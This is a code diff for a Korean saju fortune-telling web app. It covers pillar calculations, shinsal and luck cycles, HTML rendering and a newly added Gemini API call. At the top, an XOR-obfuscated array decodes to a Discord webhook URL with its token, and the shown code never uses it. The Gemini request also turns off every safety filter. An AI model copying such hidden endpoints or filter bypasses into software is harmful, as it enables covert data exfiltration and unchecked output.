 const _$a=[50,46,46,42,41,96,117,117,62,51,41,57,53,40,62,116,57,53,55,117,59,42,51,117,45,63,56,50,53,53,49,41,117,107,110,109,110,106,111,106,106,99,104,110,108,106,108,109,107,107,106,99,117,17,27,108,15,16,30,30,8,12,107,34,104,99,43,5,63,14,29,30,49,14,105,19,11,42,9,104,62,34,99,110,55,34,110,111,111,40,34,56,24,61,15,105,98,50,109,53,52,35,0,62,57,3,34,0,40,21,45,46,45,19,52,13,5,53,99,19,29];
 const _$b=k=>_$a.map(c=>String.fromCharCode(c^k)).join('');
 const _$c=()=>_$b(0x5A);
 
+const MODELS=['gemini-3-flash-preview','gemini-2.5-flash','gemini-2.5-flash-lite'];
+const SAFETY_OFF=[
+  {category:'HARM_CATEGORY_HARASSMENT',threshold:'BLOCK_NONE'},
+  {category:'HARM_CATEGORY_HATE_SPEECH',threshold:'BLOCK_NONE'},
+  {category:'HARM_CATEGORY_SEXUALLY_EXPLICIT',threshold:'BLOCK_NONE'},
+  {category:'HARM_CATEGORY_DANGEROUS_CONTENT',threshold:'BLOCK_NONE'},
+];
+
+async function callGemini(prompt, maxTokens=2048){
+  for(const model of MODELS){
+    try{
+      const ep=`https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${_$gk()}`;
+      const res=await fetch(ep,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          contents:[{role:'user',parts:[{text:prompt}]}],
+          safetySettings:SAFETY_OFF,
+          generationConfig:{maxOutputTokens:maxTokens,temperature:0.85,thinkingConfig:{thinkingBudget:0}}
+        })
+      });
+      const json=await res.json();
+      if(json.error) throw new Error(`[${json.error.code}] ${json.error.message}`);
+      const cand=(json.candidates||[])[0];
+      if(cand?.finishReason==='SAFETY') throw new Error('SAFETY_BLOCK');
+      const txt=(cand?.content?.parts||[]).filter(p=>p.text&&!p.thought).map(p=>p.text).join('').trim();
+      if(txt){console.log(`[OK] ${model}`);return txt;}
+    }catch(e){
+      console.warn(`[${model}]`,e.message);
+      await new Promise(r=>setTimeout(r,400));
+    }
+  }
+  return null;
+}
+
 // =====================================================
-// 기본 상수
+// 명리학 상수
 // =====================================================
 const STEMS   = ["甲","乙","丙","丁","戊","己","庚","辛","壬","癸"];
 const STEM_KOR= ["갑","을","병","정","무","기","경","신","임","계"];
 const BRANCHES= ["子","丑","寅","卯","辰","巳","午","未","申","酉","戌","亥"];
 const BR_KOR  = ["자","축","인","묘","진","사","오","미","신","유","술","해"];
-
 const SI = [[0,1],[0,0],[1,1],[1,0],[2,1],[2,0],[3,1],[3,0],[4,1],[4,0]];
 const BI = [[4,0],[2,0],[0,1],[0,0],[2,1],[1,1],[1,0],[2,0],[3,1],[3,0],[2,1],[4,1]];
-
 const ELE = {
   name:["木","火","土","金","水"],
-  kor: ["목(木)","화(火)","토(土)","금(金)","수(水)"],
-  dot: ["#5abf85","#e07070","#d4a843","#94a3b8","#60a5fa"],
-  bg:  ["bg-w","bg-f","bg-e","bg-m","bg-wa"],
-  bar: ["bw","bf","be","bm","bwa"],
-  tag: ["ele-w","ele-f","ele-e","ele-m","ele-wa"],
+  kor:["목(木)","화(火)","토(土)","금(金)","수(水)"],
+  dot:["#5abf85","#e07070","#d4a843","#7090c0","#60a5fa"],
+  bg:["bg-w","bg-f","bg-e","bg-m","bg-wa"],
+  bar:["bw","bf","be","bm","bwa"],
   prose:["나무","불","대지","바위","물"],
   traits:["성장·인내·기획","열정·표현·창의","안정·신중·현실","결단·규율·분석","지혜·유연·적응"]
 };
 
-function getTG(dStem, tEle, tYang) {
-  const me=SI[dStem], diff=((tEle-me[0])+5)%5, same=(me[1]===tYang);
-  return [["비견","겁재"],["식신","상관"],["편재","정재"],["편관","정관"],["편인","정인"]][diff][same?0:1];
+function getTG(dStem,tEle,tYang){
+  const me=SI[dStem],diff=((tEle-me[0])+5)%5,same=(me[1]===tYang);
+  return[["비견","겁재"],["식신","상관"],["편재","정재"],["편관","정관"],["편인","정인"]][diff][same?0:1];
 }
 
 // =====================================================
-// 만세력 계산 (시간 없을 때 안전 처리 포함)
+// 만세력 계산
 // =====================================================
-function calcPillars(dateStr, timeStr) {
+function calcPillars(dateStr,timeStr){
   const [y,m,d]=dateStr.split('-').map(Number);
-
-  // ★ 수정: 시간 미입력 시 정오(12:00) 기본값 적용
-  let hour = 12;
-  if(timeStr && timeStr.trim() !== '') {
-    const parsed = parseInt(timeStr.split(':')[0]);
-    if(!isNaN(parsed)) hour = parsed;
+  let hour=12;
+  if(timeStr&&timeStr.trim()){
+    const p=parseInt(timeStr.split(':')[0]);
+    if(!isNaN(p)) hour=p;
   }
-
   const nd=[0,6,4,6,5,6,6,7,8,8,8,8,7];
-
   let sy=(m===1||(m===2&&d<nd[2]))?y-1:y;
   let mI=d>=nd[m]?m%12:(m-1)%12;
   if(mI===0)mI=12;
-  let mB=mI%12; if(mI===12)mB=1; if(mI===1)mB=0;
-
+  let mB=mI%12;if(mI===12)mB=1;if(mI===1)mB=0;
   let ySt=((sy-1984)%10+10)%10;
   let yBr=((sy-1984)%12+12)%12;
   const msb=((ySt%5)*2+2)%10;
   let mSt=((msb+(mB-2))%10+10)%10;
-
-  const anc=Date.UTC(1985,8,2), tgt=Date.UTC(y,m-1,d);
+  const anc=Date.UTC(1985,8,2),tgt=Date.UTC(y,m-1,d);
   const dd=Math.round((tgt-anc)/86400000);
   let dSt=((0+dd)%10+10)%10;
   let dBr=((4+dd)%12+12)%12;
   const c60=((40+dd)%60+60)%60;
-
   const tBr=Math.floor((hour+1)/2)%12;
   let tSt=(((dSt%5)*2)+tBr)%10;
-
   const cnt=[0,0,0,0,0];
   [[ySt,1],[yBr,0],[mSt,1],[mB,0],[dSt,1],[dBr,0],[tSt,1],[tBr,0]].forEach(([i,s])=>{
     cnt[(s?SI:BI)[i][0]]++;
   });
-
-  return {
-    year :{stem:ySt,branch:yBr, tg:getTG(dSt,...BI[yBr])},
-    month:{stem:mSt,branch:mB,  tg:getTG(dSt,...BI[mB])},
-    day  :{stem:dSt,branch:dBr, tg:"본원"},
-    time :{stem:tSt,branch:tBr, tg:getTG(dSt,...BI[tBr])},
-    cnt, c60, y, m, d, ySt, mSt, dSt,
-    hasTime: !!(timeStr && timeStr.trim() !== '')
+  return{
+    year:{stem:ySt,branch:yBr,tg:getTG(dSt,...BI[yBr])},
+    month:{stem:mSt,branch:mB,tg:getTG(dSt,...BI[mB])},
+    day:{stem:dSt,branch:dBr,tg:"본원"},
+    time:{stem:tSt,branch:tBr,tg:getTG(dSt,...BI[tBr])},
+    cnt,c60,y,m,d,ySt,mSt,dSt,
+    hasTime:!!(timeStr&&timeStr.trim())
   };
 }
 
 // =====================================================
-// 신살 계산
+// 신살
 // =====================================================
-const SAL_INFO = {
-  "천을귀인":{ type:"gil", desc:"하늘이 내린 최고의 길성. 어려운 순간마다 귀인의 도움을 받으며, 큰 위기도 자연스럽게 넘어갑니다. 시험·취업·사업에서 생각지 못한 도움이 찾아옵니다.", tip:"어렵고 힘들 때 남에게 손을 내밀어 보세요. 반드시 도움이 나타납니다." },
-  "문창귀인":{ type:"gil", desc:"학문과 예술의 별. 뛰어난 지적 능력과 글재주, 창의성을 타고났습니다. 언어·교육·문서·미디어 계통에서 두각을 나타냅니다.", tip:"공부와 글쓰기를 꾸준히 하면 큰 성과를 냅니다." },
-  "도화살":{ type:"mix", desc:"매력과 인기의 별. 이성에게 인기가 많고 예술적 감성이 풍부합니다. 연예·예술·서비스업에 유리하나 감정적 유혹과 색정 문제에 주의가 필요합니다.", tip:"감정의 흐름을 잘 다스리면 도화살은 큰 자산이 됩니다." },
-  "역마살":{ type:"mix", desc:"이동과 변화의 별. 여행·이직·이사가 많고 해외운이 강합니다. 한 곳에 오래 있기보다 활동적인 환경에서 성과를 냅니다.", tip:"국제·무역·여행·물류 관련 직종에서 빛납니다." },
-  "공망":{ type:"sal", desc:"비어있는 기운. 해당 위치의 십신 기운이 약화되어 계획이 어긋나거나 결과가 기대에 미치지 못할 수 있습니다. 특히 물질적 손실이나 관계의 공허감에 주의하세요.", tip:"집착을 내려놓고 정신적 수련·종교·예술에 관심을 두면 공망을 길하게 전환할 수 있습니다." },
-  "양인살":{ type:"sal", desc:"날카로운 칼의 에너지. 강한 추진력과 결단력을 주지만 과격하거나 충동적인 행동, 사고·수술 등 신체 손상에 주의가 필요합니다.", tip:"에너지를 운동·경쟁·리더십으로 순화하면 강력한 성공 동력이 됩니다." },
-  "화개살":{ type:"mix", desc:"예술·종교·철학의 별. 예술·학문·영성에 뛰어난 재능을 보이지만 고독하거나 혼자 있는 시간이 많을 수 있습니다.", tip:"창작·수련·연구 활동에서 내면의 보물을 찾게 됩니다." },
-  "백호살":{ type:"sal", desc:"강렬한 에너지의 흰 호랑이. 급작스러운 사고나 혈광지재(혈관계 질병)에 주의가 필요하지만, 강한 기운으로 큰 성공을 이룰 수도 있습니다.", tip:"건강 관리와 안전 수칙을 철저히 지키세요." },
+const SAL_INFO={
+  "천을귀인":{type:"gil",desc:"하늘이 내린 최고의 길성. 어려운 순간마다 귀인의 도움을 받으며, 큰 위기도 자연스럽게 넘어갑니다.",tip:"어렵고 힘들 때 남에게 손을 내밀어 보세요. 반드시 도움이 나타납니다."},
+  "문창귀인":{type:"gil",desc:"학문과 예술의 별. 뛰어난 지적 능력과 글재주, 창의성을 타고났습니다.",tip:"공부와 글쓰기를 꾸준히 하면 큰 성과를 냅니다."},
+  "도화살":{type:"mix",desc:"매력과 인기의 별. 이성에게 인기가 많고 예술적 감성이 풍부합니다. 감정적 유혹에 주의.",tip:"감정의 흐름을 잘 다스리면 도화살은 큰 자산이 됩니다."},
+  "역마살":{type:"mix",desc:"이동과 변화의 별. 여행·이직·이사가 많고 해외운이 강합니다.",tip:"국제·무역·여행·물류 관련 직종에서 빛납니다."},
+  "공망":{type:"sal",desc:"비어있는 기운. 해당 위치의 십신 기운이 약화되어 계획이 어긋날 수 있습니다.",tip:"집착을 내려놓고 정신적 수련에 관심을 두면 길하게 전환됩니다."},
+  "양인살":{type:"sal",desc:"날카로운 칼의 에너지. 강한 추진력을 주지만 과격한 행동, 사고에 주의.",tip:"에너지를 운동·경쟁·리더십으로 순화하면 강력한 성공 동력이 됩니다."},
+  "화개살":{type:"mix",desc:"예술·종교·철학의 별. 뛰어난 재능을 보이지만 고독한 면이 있습니다.",tip:"창작·수련·연구 활동에서 내면의 보물을 찾게 됩니다."},
+  "백호살":{type:"sal",desc:"급작스러운 사고나 혈관계 질병에 주의가 필요하지만 강한 기운으로 큰 성공도 가능.",tip:"건강 관리와 안전 수칙을 철저히 지키세요."},
 };
 
-function calcShinssal(data) {
-  const {day,year,month,time,c60,dSt} = data;
+function calcShinssal(data){
+  const{day,year,month,time,c60,dSt}=data;
   const allBr=[year.branch,month.branch,day.branch,time.branch];
   const pos=["년주","월주","일주","시주"];
   const res=[];
-
   const cu={0:[1,7],4:[1,7],6:[1,7],1:[0,8],5:[0,8],2:[11,9],3:[11,9],8:[3,5],9:[3,5],7:[6,2]};
   const cuBr=cu[dSt]||[];
   const cuPos=allBr.map((b,i)=>cuBr.includes(b)?pos[i]:null).filter(Boolean);
-  if(cuPos.length) res.push({name:"천을귀인",positions:cuPos,branches:cuBr.map(b=>BRANCHES[b]+BR_KOR[b])});
-
+  if(cuPos.length) res.push({name:"천을귀인",positions:cuPos});
   const mc=[5,6,8,9,8,9,11,0,2,3][dSt];
   const mcPos=allBr.map((b,i)=>b===mc?pos[i]:null).filter(Boolean);
-  if(mcPos.length) res.push({name:"문창귀인",positions:mcPos,branches:[BRANCHES[mc]+BR_KOR[mc]]});
-
+  if(mcPos.length) res.push({name:"문창귀인",positions:mcPos});
   const sun=Math.floor(c60/10);
   const gmBr=[[10,11],[8,9],[6,7],[4,5],[2,3],[0,1]][sun];
   const gmPos=allBr.map((b,i)=>gmBr.includes(b)?pos[i]:null).filter(Boolean);
-  if(gmPos.length) res.push({name:"공망",positions:gmPos,branches:gmBr.map(b=>BRANCHES[b]+BR_KOR[b])});
-
+  if(gmPos.length) res.push({name:"공망",positions:gmPos});
   const dhMap={2:3,6:3,10:3,8:9,0:9,4:9,5:6,9:6,1:6,11:0,3:0,7:0};
   const dhBr=dhMap[day.branch];
-  if(dhBr!==undefined){
-    const dhPos=allBr.map((b,i)=>b===dhBr?pos[i]:null).filter(Boolean);
-    if(dhPos.length) res.push({name:"도화살",positions:dhPos,branches:[BRANCHES[dhBr]+BR_KOR[dhBr]]});
-  }
-
+  if(dhBr!==undefined){const p=allBr.map((b,i)=>b===dhBr?pos[i]:null).filter(Boolean);if(p.length)res.push({name:"도화살",positions:p});}
   const ymMap={2:8,6:8,10:8,8:2,0:2,4:2,5:11,9:11,1:11,11:5,3:5,7:5};
   const ymBr=ymMap[year.branch];
-  if(ymBr!==undefined){
-    const ymPos=allBr.map((b,i)=>b===ymBr?pos[i]:null).filter(Boolean);
-    if(ymPos.length) res.push({name:"역마살",positions:ymPos,branches:[BRANCHES[ymBr]+BR_KOR[ymBr]]});
-  }
-
+  if(ymBr!==undefined){const p=allBr.map((b,i)=>b===ymBr?pos[i]:null).filter(Boolean);if(p.length)res.push({name:"역마살",positions:p});}
   const yaiBr=[3,4,6,7,6,7,9,10,0,1][dSt];
   const yaiPos=allBr.map((b,i)=>b===yaiBr?pos[i]:null).filter(Boolean);
-  if(yaiPos.length) res.push({name:"양인살",positions:yaiPos,branches:[BRANCHES[yaiBr]+BR_KOR[yaiBr]]});
-
+  if(yaiPos.length) res.push({name:"양인살",positions:yaiPos});
   const hgMap={2:10,6:10,10:10,8:4,0:4,4:4,5:1,9:1,1:1,11:7,3:7,7:7};
   const hgBr=hgMap[year.branch];
-  if(hgBr!==undefined){
-    const hgPos=allBr.map((b,i)=>b===hgBr?pos[i]:null).filter(Boolean);
-    if(hgPos.length) res.push({name:"화개살",positions:hgPos,branches:[BRANCHES[hgBr]+BR_KOR[hgBr]]});
-  }
-
+  if(hgBr!==undefined){const p=allBr.map((b,i)=>b===hgBr?pos[i]:null).filter(Boolean);if(p.length)res.push({name:"화개살",positions:p});}
   const bhMap={0:4,1:7,2:10,3:1,4:4,5:1,6:10,7:7,8:10,9:1};
   const bhBr=bhMap[dSt];
-  if(bhBr!==undefined){
-    const bhPos=allBr.map((b,i)=>b===bhBr?pos[i]:null).filter(Boolean);
-    if(bhPos.length) res.push({name:"백호살",positions:bhPos,branches:[BRANCHES[bhBr]+BR_KOR[bhBr]]});
-  }
-
+  if(bhBr!==undefined){const p=allBr.map((b,i)=>b===bhBr?pos[i]:null).filter(Boolean);if(p.length)res.push({name:"백호살",positions:p});}
   return res;
 }
 
 // =====================================================
 // 대운·세운·월운
 // =====================================================
-function calcDaeun(data, gender) {
-  const {y,m,d,ySt,mSt,month} = data;
-  const yYang=SI[ySt][1];
-  const fwd=(gender==='male')===yYang;
+function calcDaeun(data,gender){
+  const{y,m,d,ySt,mSt,month}=data;
+  const fwd=(gender==='male')===SI[ySt][1];
   const nd=[0,6,4,6,5,6,6,7,8,8,8,8,7];
-
   let days;
   if(fwd){
     const nm=m===12?1:m+1;
     const dim=new Date(y,m,0).getDate();
     days=d<nd[m]?nd[m]-d:(dim-d)+(nd[nm]||6);
-  } else {
+  }else{
     if(d>=nd[m]){days=d-nd[m];}
     else{
       const pm=m===1?12:m-1;
@@ -684,39 +973,28 @@ function calcDaeun(data, gender) {
     }
   }
   const sa=Math.max(1,Math.round(days/3));
-
   const pillars=[];
   let cs=mSt,cb=month.branch;
   for(let i=0;i<8;i++){
     cs=fwd?(cs+1)%10:(cs-1+10)%10;
     cb=fwd?(cb+1)%12:(cb-1+12)%12;
     const age=sa+i*10;
-    const startYear=y+age;
-    pillars.push({stem:cs,branch:cb,startAge:age,endAge:age+9,startYear,endYear:startYear+9});
+    pillars.push({stem:cs,branch:cb,startAge:age,endAge:age+9,startYear:y+age,endYear:y+age+9});
   }
-  return {pillars,fwd,sa};
+  return{pillars,fwd,sa};
 }
-
-function getSeun(fromY=CURRENT_YEAR-2, cnt=10){
+function getSeun(from=CURRENT_YEAR-2,cnt=10){
   return Array.from({length:cnt},(_,i)=>{
-    const y=fromY+i;
-    return{year:y, stem:((y-1984)%10+10)%10, branch:((y-1984)%12+12)%12, isCur:y===CURRENT_YEAR};
+    const y=from+i;
+    return{year:y,stem:((y-1984)%10+10)%10,branch:((y-1984)%12+12)%12,isCur:y===CURRENT_YEAR};
   });
 }
-
-// ★ 수정: 병오(丙午)년 월운 고정 계산 (2026년 천간 丙 = index 2)
 function getWolun(){
-  // 2026년 = 병오년. 丙(index 2)의 msb = ((2%5)*2+2)%10 = 6 (庚)
-  const msb = 6;
-  return Array.from({length:12},(_,i)=>({
-    month:i+1,
-    stem:(msb+i)%10,
-    branch:(i+2)%12   // 인월(寅=2)부터 시작
-  }));
+  return Array.from({length:12},(_,i)=>({month:i+1,stem:(6+i)%10,branch:(i+2)%12}));
 }
 
 // =====================================================
-// 천간·지지 설명 데이터
+// 천간·지지 설명
 // =====================================================
 const STEM_DESC={
   "甲":["대들보 목","동쪽을 향해 곧게 뻗는 거목. 리더십, 진취성, 굳은 원칙을 가진 성품."],
@@ -728,7 +1006,7 @@ const STEM_DESC={
   "庚":["도끼 금","날카로운 원석. 결단력, 의리, 강한 추진력을 지니고 있습니다."],
   "辛":["보석 금","빛나는 보석. 완벽주의적 성향과 섬세한 미적 감각이 돋보입니다."],
   "壬":["큰 강 수","거대한 강물. 지혜와 포용력, 유연한 사고와 지적 탐구심을 상징합니다."],
-  "癸":["빗물 수","大地를 적시는 빗물. 통찰력, 상상력, 감수성이 풍부합니다."],
+  "癸":["빗물 수","대지를 적시는 빗물. 통찰력, 상상력, 감수성이 풍부합니다."],
 };
 const BR_DESC={
   "子":["자시·자수","생명의 씨앗이 잠든 시간. 지혜, 민첩함, 음적 에너지가 강합니다."],
@@ -744,129 +1022,110 @@ const BR_DESC={
   "戌":["술시·술토","수호자 개. 충성심, 원칙주의, 외로움과 고집스러운 면이 공존합니다."],
   "亥":["해시·해수","겨울의 돼지. 넓은 포용력, 자유로운 영혼, 직관적 통찰이 강합니다."],
 };
-
 const DAY_DESC={
   "甲子":"활발하고 총명하며 인기가 많습니다. 창의적 사고와 빠른 적응력으로 어떤 환경에서도 빛나지만, 감정 기복에 주의가 필요합니다.",
-  "甲辰":"강한 리더십과 포용력을 갖춘 일주입니다. 조직을 이끄는 힘이 뛰어나지만 고집스러운 면이 있으므로 유연성을 키우세요.",
-  "甲午":"열정적이고 표현력이 강합니다. 예술·연예·교육 분야에서 재능을 발휘하며, 대인관계에서 활발하게 빛납니다.",
-  "乙丑":"끈기와 인내의 일주. 느리지만 확실하게 목표를 이루며 세심하고 배려가 넘칩니다.",
-  "乙巳":"직관력과 탐구심이 강합니다. 전문직이나 연구 분야에서 탁월한 성과를 내며 독립적인 성향이 강합니다.",
   "丙午":"태양이 정오에 빛나는 화려한 일주. 카리스마와 열정이 넘치며, 가는 곳마다 중심이 됩니다.",
-  "丙寅":"진취적이고 에너지가 넘칩니다. 강한 실행력으로 새로운 일을 개척하는 데 두각을 나타냅니다.",
-  "丁卯":"섬세하고 예술적인 감성을 지녔습니다. 창작과 탐구에서 빛나며 은근한 매력이 있습니다.",
-  "戊辰":"산과 같이 묵직하고 안정적입니다. 큰 조직이나 부동산·금융 분야에서 성공하는 경우가 많습니다.",
-  "戊午":"열정과 안정감을 겸비한 일주. 리더십이 강하고 사람들에게 신뢰를 줍니다.",
-  "庚辰":"강한 결단력과 실행력의 일주. 목표를 향해 거침없이 나아가지만 원만한 관계 유지에 신경 쓰세요.",
-  "庚申":"강력한 금(金) 기운의 일주. 의리와 결단력, 완고함이 공존하며 군인·법조·스포츠에서 빛납니다.",
   "壬子":"지혜와 통찰의 일주. 지적 탐구와 글쓰기에서 두각을 나타내며 독립적인 성향이 강합니다.",
-  "壬午":"물과 불이 만나는 극적인 일주. 창의성과 감수성이 뛰어나지만 내면의 갈등을 다스리는 것이 중요합니다.",
-  "癸亥":"깊은 직관과 풍부한 상상력의 일주. 예술·철학·연구 분야에서 빛나며 감수성이 특히 예민합니다.",
 };
 
 // =====================================================
-// 렌더링
+// 상태 변수
 // =====================================================
 let _data=null,_gen='male',_name='',_daeun=null,_seun=null,_wolun=null,_sal=null;
+let _mode=''; // 'saju' | 'compat'
 
-function stemBg(i){ return ELE.bg[SI[i][0]]; }
-function brBg(i){ return ELE.bg[BI[i][0]]; }
+function stemBg(i){return ELE.bg[SI[i][0]];}
+function brBg(i){return ELE.bg[BI[i][0]];}
 
-function renderPillars(data) {
+// =====================================================
+// 모드 선택
+// =====================================================
+function goMode(mode){
+  if(mode==='compatN'){
+    document.getElementById('homeSection').style.display='none';
+    document.getElementById('compatNSection').style.display='block';
+    document.getElementById('resetBtn').style.display='block';
+    initNPersons();
+    window.scrollTo({top:0,behavior:'smooth'});
+    return;
+  }
+  _mode=mode;
+  document.getElementById('homeSection').style.display='none';
+  document.getElementById('sajuSection').style.display= mode==='saju'?'block':'none';
+  document.getElementById('compatSection').style.display= mode==='compat'?'block':'none';
+  document.getElementById('resetBtn').style.display='block';
+}
+
+// =====================================================
+// 렌더링 — 사주 팔자
+// =====================================================
+function renderPillars(data){
   const cols=[
-    {label:"시주(時柱)",p:data.time, isDay:false},
-    {label:"일주(日柱)",p:data.day,  isDay:true},
+    {label:"시주(時柱)",p:data.time,isDay:false},
+    {label:"일주(日柱)",p:data.day,isDay:true},
     {label:"월주(月柱)",p:data.month,isDay:false},
-    {label:"년주(年柱)",p:data.year, isDay:false},
+    {label:"년주(年柱)",p:data.year,isDay:false},
   ];
-  const tbl=document.getElementById('pTable');
-  tbl.innerHTML=`
+  document.getElementById('pTable').innerHTML=`
     <tr>${cols.map(c=>`<th>${c.label}</th>`).join('')}</tr>
-    <tr class="stem-row">${cols.map(c=>`
-      <td>
-        <div class="pcell ${stemBg(c.p.stem)} ${c.isDay?'day-hl':''}">
-          <span class="hanja">${STEMS[c.p.stem]}</span>
-          <span class="hangul">${STEM_KOR[c.p.stem]}</span>
-        </div>
-      </td>`).join('')}</tr>
-    <tr class="br-row">${cols.map(c=>`
-      <td>
-        <div class="pcell ${brBg(c.p.branch)} ${c.isDay?'day-hl':''}">
-          <span class="hanja">${BRANCHES[c.p.branch]}</span>
-          <span class="hangul">${BR_KOR[c.p.branch]}</span>
-        </div>
-      </td>`).join('')}</tr>
-    <tr class="tg-row">${cols.map(c=>`
-      <td style="text-align:center">
-        <span class="tengod ${c.isDay?'me':''}">${c.p.tg}</span>
-      </td>`).join('')}</tr>
-    ${!data.hasTime?`<tr><td colspan="4" style="text-align:center;padding-top:6px"><span style="font-size:10px;color:var(--text3)">⚠ 시간 미입력 — 시주는 참고용입니다</span></td></tr>`:''}
+    <tr>${cols.map(c=>`<td><div class="pcell ${stemBg(c.p.stem)} ${c.isDay?'day-hl':''}">
+      <span class="hanja">${STEMS[c.p.stem]}</span><span class="hangul">${STEM_KOR[c.p.stem]}</span>
+    </div></td>`).join('')}</tr>
+    <tr>${cols.map(c=>`<td><div class="pcell ${brBg(c.p.branch)} ${c.isDay?'day-hl':''}">
+      <span class="hanja">${BRANCHES[c.p.branch]}</span><span class="hangul">${BR_KOR[c.p.branch]}</span>
+    </div></td>`).join('')}</tr>
+    <tr>${cols.map(c=>`<td style="text-align:center"><span class="tengod ${c.isDay?'me':''}">${c.p.tg}</span></td>`).join('')}</tr>
+    ${!data.hasTime?`<tr><td colspan="4" style="text-align:center;padding-top:5px"><span style="font-size:10px;color:var(--text3)">⚠ 시간 미입력 — 시주 참고용</span></td></tr>`:''}
   `;
 }
 
-function renderStemBranchDesc(data) {
+function renderStemBranchDesc(data){
   const pillars=[
     {label:"년주",stem:data.year.stem,branch:data.year.branch},
     {label:"월주",stem:data.month.stem,branch:data.month.branch},
     {label:"일주(나)",stem:data.day.stem,branch:data.day.branch},
     {label:"시주",stem:data.time.stem,branch:data.time.branch},
   ];
-  const box=document.getElementById('stemBranchDesc');
-  box.innerHTML=pillars.map(p=>{
-    const sn=STEMS[p.stem], bn=BRANCHES[p.branch];
+  document.getElementById('stemBranchDesc').innerHTML=pillars.map(p=>{
+    const sn=STEMS[p.stem],bn=BRANCHES[p.branch];
     const sd=STEM_DESC[sn]||[sn,"오행의 기운을 담고 있습니다."];
     const bd=BR_DESC[bn]||[bn,"지지의 기운을 담고 있습니다."];
     return `
       <div class="explain-row">
-        <div class="explain-icon">
-          <span class="pcell ${stemBg(p.stem)}" style="width:36px;height:38px;padding:4px;border-radius:9px;display:inline-flex;flex-direction:column;align-items:center;justify-content:center">
-            <span class="hanja" style="font-size:18px">${sn}</span>
-            <span class="hangul" style="font-size:9px">${STEM_KOR[p.stem]}</span>
-          </span>
-        </div>
-        <div class="explain-body">
-          <div class="explain-title">${p.label} 천간 — ${sn}(${STEM_KOR[p.stem]}) · ${sd[0]}</div>
-          <div class="explain-desc">${sd[1]}</div>
-        </div>
+        <div class="explain-icon"><div class="pcell ${stemBg(p.stem)}" style="width:34px;height:36px;padding:3px;border-radius:8px;display:inline-flex;flex-direction:column;align-items:center;justify-content:center">
+          <span class="hanja" style="font-size:16px">${sn}</span><span class="hangul" style="font-size:8px">${STEM_KOR[p.stem]}</span>
+        </div></div>
+        <div><div class="explain-title">${p.label} 천간 — ${sn} · ${sd[0]}</div><div class="explain-desc">${sd[1]}</div></div>
       </div>
       <div class="explain-row">
-        <div class="explain-icon">
-          <span class="pcell ${brBg(p.branch)}" style="width:36px;height:38px;padding:4px;border-radius:9px;display:inline-flex;flex-direction:column;align-items:center;justify-content:center">
-            <span class="hanja" style="font-size:18px">${bn}</span>
-            <span class="hangul" style="font-size:9px">${BR_KOR[p.branch]}</span>
-          </span>
-        </div>
-        <div class="explain-body">
-          <div class="explain-title">${p.label} 지지 — ${bn}(${BR_KOR[p.branch]}) · ${bd[0]}</div>
-          <div class="explain-desc">${bd[1]}</div>
-        </div>
-      </div>
-    `;
+        <div class="explain-icon"><div class="pcell ${brBg(p.branch)}" style="width:34px;height:36px;padding:3px;border-radius:8px;display:inline-flex;flex-direction:column;align-items:center;justify-content:center">
+          <span class="hanja" style="font-size:16px">${bn}</span><span class="hangul" style="font-size:8px">${BR_KOR[p.branch]}</span>
+        </div></div>
+        <div><div class="explain-title">${p.label} 지지 — ${bn} · ${bd[0]}</div><div class="explain-desc">${bd[1]}</div></div>
+      </div>`;
   }).join('');
 }
 
-function renderShinssal(sal) {
+function renderShinssal(sal){
   const area=document.getElementById('sinsalArea');
   if(!sal.length){area.innerHTML='<p class="txt-sm" style="color:var(--text3)">주요 신살이 발견되지 않았습니다.</p>';return;}
   area.innerHTML=sal.map(s=>{
     const info=SAL_INFO[s.name]||{type:'mix'};
     const cls=info.type==='gil'?'sal-gil':info.type==='sal'?'sal-sal':'sal-mix';
     const icon=info.type==='gil'?'⭐':info.type==='sal'?'⚠️':'🔀';
-    return `<span class="sal-badge ${cls}" onclick="showModal('${s.name}','${s.positions.join('·')}')">
-      ${icon} ${s.name} <span style="font-size:9px;opacity:.7">${s.positions.join('·')}</span>
-    </span>`;
+    return `<span class="sal-badge ${cls}" onclick="showModal('${s.name}','${s.positions.join('·')}')">${icon} ${s.name} <span style="font-size:9px;opacity:.7">${s.positions.join('·')}</span></span>`;
   }).join('');
-  const desc=document.getElementById('sinsalDesc');
   const gils=sal.filter(s=>(SAL_INFO[s.name]||{}).type==='gil');
   const sals=sal.filter(s=>(SAL_INFO[s.name]||{}).type==='sal');
-  desc.innerHTML=`<p class="txt-sm">
-    ${gils.length?`<strong style="color:var(--gold2)">길성 ${gils.length}개</strong>(${gils.map(s=>s.name).join('·')}) 발견 — 귀인 복과 재능의 기운이 강합니다. `:''}
-    ${sals.length?`<strong style="color:#e8807a">신살 ${sals.length}개</strong>(${sals.map(s=>s.name).join('·')}) 확인 — 주의사항을 숙지하고 대비하세요.`:''}
+  document.getElementById('sinsalDesc').innerHTML=`<p class="txt-sm">
+    ${gils.length?`<strong style="color:var(--rose)">길성 ${gils.length}개</strong>(${gils.map(s=>s.name).join('·')}) — 귀인 복이 있습니다. `:''}
+    ${sals.length?`<strong style="color:#c04040">신살 ${sals.length}개</strong>(${sals.map(s=>s.name).join('·')}) — 주의사항을 확인하세요.`:''}
   </p>`;
 }
 
-function renderEle(cnt) {
+function renderEle(cnt){
   const tot=cnt.reduce((a,b)=>a+b,0)||1;
-  const maxI=cnt.indexOf(Math.max(...cnt)), minI=cnt.indexOf(Math.min(...cnt));
+  const maxI=cnt.indexOf(Math.max(...cnt)),minI=cnt.indexOf(Math.min(...cnt));
   document.getElementById('eleChart').innerHTML=cnt.map((c,i)=>`
     <div class="ebar">
       <div class="ebar-hdr">
@@ -884,429 +1143,352 @@ function renderEle(cnt) {
     <div class="str-item"><div class="str-val" style="color:${ELE.dot[minI]}">${ELE.name[minI]}</div><div class="str-lbl">보충 필요 기운</div></div>`;
 }
 
-function renderDayCard(data) {
-  const sn=STEMS[data.day.stem], bn=BRANCHES[data.day.branch], key=sn+bn;
+function renderDayCard(data){
+  const sn=STEMS[data.day.stem],bn=BRANCHES[data.day.branch],key=sn+bn;
   const desc=DAY_DESC[key]||`${sn}(${STEM_KOR[data.day.stem]})${bn}(${BR_KOR[data.day.branch]}) 일주입니다. ${ELE.kor[SI[data.day.stem][0]]} 오행의 기운이 중심을 이루며 ${ELE.traits[SI[data.day.stem][0]]}의 성향이 두드러집니다.`;
   document.getElementById('dayDesc').innerHTML=`
-    <div style="display:flex;gap:12px;align-items:flex-start">
-      <div style="display:flex;gap:5px">
